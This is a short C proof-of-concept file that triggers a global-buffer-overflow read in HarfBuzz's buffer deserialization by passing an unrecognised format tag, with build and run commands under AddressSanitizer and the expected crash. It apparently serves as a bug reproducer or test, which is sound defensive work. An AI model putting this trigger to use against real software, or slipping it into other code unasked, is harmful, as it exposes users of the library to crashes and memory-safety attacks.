/* PoC for a global-buffer-overflow in _hb_buffer_deserialize_format_supported()
 * introduced in src/hb-buffer-serialize.cc.
 *
 * Build (ASan):
 *   g++ -std=c++17 -fsanitize=address -g -O0 -I <harfbuzz>/src \
 *       pocs/newbug.c <harfbuzz>/src/harfbuzz.cc -lpthread -o newbug
 *
 * Run:
 *   ASAN_OPTIONS=abort_on_error=1 ./newbug
 *
 * Expected: ASan reports a global-buffer-overflow read on
 * 'supported_deserialize_formats' and aborts (rc 134).
 */

#include <hb.h>

int
main (void)
{
  hb_buffer_t *b = hb_buffer_create ();

  const char *text = "<U+0041=0+100>";
  /* Any format value that is neither HB_BUFFER_SERIALIZE_FORMAT_TEXT nor
   * HB_BUFFER_SERIALIZE_FORMAT_JSON is in-contract: the public API
   * documents hb_buffer_serialize_format_t as a FourCC-style tag and
   * hb_buffer_serialize_format_from_string() explicitly does not
   * validate its result, so callers routinely pass unrecognized tags
   * here (this is exactly the scenario the surrounding fix targets). */
  hb_buffer_serialize_format_t bogus = (hb_buffer_serialize_format_t) HB_TAG ('B','O','G','U');

  hb_buffer_deserialize_glyphs (b, text, -1, NULL, NULL, bogus);

  hb_buffer_destroy (b);
  return 0;
}
